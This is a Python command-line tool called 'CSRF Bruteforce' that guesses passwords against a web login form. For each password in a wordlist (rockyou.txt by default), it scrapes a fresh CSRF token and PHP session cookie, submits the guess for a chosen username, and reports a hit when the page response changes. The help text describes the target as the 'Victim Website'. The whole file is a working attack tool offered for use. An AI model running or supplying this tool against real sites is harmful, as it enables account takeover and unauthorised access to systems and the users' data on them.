#!/usr/bin/env python3
# coding=utf-8

import requests
import re
from termcolor import colored
import argparse

x = """
         |
    pN▒g▒p▒g▒▒g▒ge
   ▒▒▒▒▒▒▒▓▓▒▒▒▒▒
 _0▒▓▒▓▒▓▓▒▒▒▒▒▒▒!
 4▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▒Y
 |` ~~#00▓▓0▒MMM"M|
       `gM▓M7
|       00Q0       |
#▒____g▒0▓▓P______0
#▒0g_p#▓▓04▒▒&,__M# 
0▒▒▒▒▒00   ]0▒▒▒▒00
 |\j▒▒0'   '0▒▒▒4M'
  |\#▒▒&▒▒gg▒▒0& |
 " ▒▒00▒▒▒▒00▒▒'d
 %  ¼▒  ~P▒¼▒▒|¼¼|
 M▒9▒,▒▒ ]▒] *▒j,g
 l▒g▒▒] @▒9
  ~▒0▒▒▒p ▒g▒
    @▓▒▒▒▒▒  ▒▒▓
     M0▓▓  ▓▓^
       `
   """
def creds():
    print(x)
    print(colored("CSRF Bruteforce", 'blue'))
    print(colored("Author: Standard", 'red'))
    print(colored("---------------------", 'white'))


def parse():
    parser = argparse.ArgumentParser(description='[+] Usage: ./brutecsrf.py --url http://test.com  --csrf centreon_token --u admin \n | NOTE: If some field doesnt have a name set it as "" ')
    parser.add_argument('--url', dest="target_url", help='Victim Website')
    parser.add_argument('--csrf', dest="csrf", help=' csrf name in HTTP form')
    parser.add_argument('--u', "--user", dest="username", help=' username you are brute forcing')
    parser.add_argument('--lu', "--fuser", dest="usr", help=' username field name in HTML form')
    parser.add_argument('--p', "--passwd", dest="passwd", help=' password field name in HTML form')
    parser.add_argument('--s', "--sub", dest="sub", help=' submit field name in HTML form')
    parser.add_argument('--w', "--wordlist", dest="wordlist", help=' path to wordlist')

    options = parser.parse_args()

    return options

# Function to the sumbit button
def get_form():
    attack = requests.get(target_url, allow_redirects=False)
    data = attack.content
    data = str(data)
    submit = re.search('(?:<input.* name=")(.*)" (?:value=")(.*)(?:" type="submit".*/>)', data)
    submit_name = submit.group(1)
    submit_value = submit.group(2)

    return [submit_name, submit_value]

# Function to basic data such as a Cookie and CSRF token from the website
def get_data():
   attack = requests.get(target_url, allow_redirects=False)
   data = attack.content
   headers = str(attack.headers["set-cookie"])
   cookie = re.search('(?:PHPSESSID=)(.*)(?:;)', headers)
   cookie = cookie.group(1)

   data = str(data)
   token = re.search(f'(?:<input name="{csrf}" type="hidden" value=")(.*)(?:" />)', data)
   csrft = token.group(1)


   return [str(csrft), str(cookie)]


# Function that gets the response from a wrong password to compare it know when we have the right password
def get_wrong(username):
    forge = get_data()
    data = {
        fuser: username,
        passwdf: "omri",
        csrf: forge[0],
        submit_name: submit_value
    }

    cookie = {
        "PHPSESSID": forge[1]
    }

    response = requests.post(target_url, data=data, cookies=cookie)
    response = (str(response.content))
    response = re.sub(f'(?:"{csrf}" type="hidden" value=")(.*)(?:" />)', "omri", response)


    return response


# Function that does the attack
def url_request(username):
    wrong = get_wrong(username)
    with open(wordlist, "r") as list:
        for line in list:
            forge = get_data()  # creating data for the POST request
            data = {
                fuser: username,
                passwdf: "",
                csrf: forge[0],
                submit_name: submit_value
            }

            cookie = {
                "PHPSESSID": forge[1]
            }

            word = line.strip()
            print("Trying : " + word, end="\r")
            data[passwdf] = word
            response = requests.post(target_url, data=data, cookies=cookie)
            response = (str(response.content))
            response = response.replace(f'value="{word}"', 'value="omri"')  # Replacing the password field with the word 'omri' so we can compare it to wrong response
            response = re.sub(f'(?:"{csrf}" type="hidden" value=")(.*)(?:" />)', "omri", response)  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response

            if response != wrong:
                print("Trying : " + word)
                print("correct password is : " + colored(word, "green"))
                exit()

        print("[-] Reached end of line.")

try:
    options = parse()

    target_url = options.target_url

    csrf = options.csrf
    user = options.username
    passwdf = options.passwd
    fuser = options.usr
    form = get_form()
    submit_name = form[0]
    submit_value = form[1]
    wordlist = options.wordlist

    if wordlist == None:
        wordlist = "/root/rockyou.txt"

    if passwdf == None:
        passwdf = "password"
    if fuser == None:
        fuser = "username"

    creds()

    url_request(user)

except Exception:
    print(colored("[-] Something went wrong - request timed out", "red"))
